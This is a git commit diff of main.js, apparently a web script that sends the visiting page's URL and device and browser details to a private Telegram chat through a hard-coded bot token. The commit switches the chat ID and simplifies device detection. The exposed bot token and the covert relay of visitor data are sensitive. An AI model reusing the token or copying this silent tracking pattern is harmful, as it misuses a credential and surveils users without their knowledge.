025a3be8df22772ef9ae68611f49f2dafe00a7ec
Sen_Dev <gospojahaku@icloud.com>
2024-01-23 17:36:07 +0200

    8

--- main.js
+++ main.js
@@ -2,33 +2,16 @@
 console.log(currentLocation);
 
 let botToken = '6735455497:AAHTFrKiu3NL-1jP_Qe3Qoi5vfvaUK2ByAY';
-let chatId = '5804614037';
+let chatId = '4128038389';
 let messageText = currentLocation.href;
 
 let apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
 function getDeviceInfo() {
-  let userAgent = navigator.userAgent;
+  let deviceModel = platform.product || "Unknown";
   let browserInfo = `Браузер: ${navigator.appName} ${navigator.appVersion}`;
-  let model = "Unknown";
 
-  if (/iPhone/.test(userAgent)) {
-    let match = userAgent.match(/iPhone\s([\w\d]+)/);
-    if (match) {
-      model = match[1];
-    } else {
-      model = "iPhone";
-    }
-  } else if (/iPad/.test(userAgent)) {
-    model = "iPad";
-  } else if (/Android/.test(userAgent)) {
-    let match = userAgent.match(/Android\s([^;]+)/);
-    if (match) {
-      model = match[1];
-    }
-  }
-
-  return `Пользователь ${model}\n${browserInfo}`;
+  return `Пользователь ${deviceModel}\n${browserInfo}`;
 }
 
 function handleTouchStart(e) {
